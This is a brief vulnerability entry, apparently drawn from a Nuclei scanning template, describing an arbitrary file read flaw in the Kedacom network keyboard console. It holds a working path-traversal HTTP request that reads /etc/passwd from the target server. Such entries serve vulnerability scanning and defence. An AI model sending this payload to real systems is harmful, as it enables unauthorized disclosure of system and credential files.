# Vulnerability: Kedacom Network Keyboard Console - Arbitrary File Read
**Classification:** LFI
**Source:** Nuclei Template (`kedacom-network-lfi.yaml`)

## Description
There is an arbitrary file reading vulnerability in the KEDACOM network keyboard console. Attacking this vulnerability can read arbitrary information from the server

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/../../../../../../../../etc/passwd
```

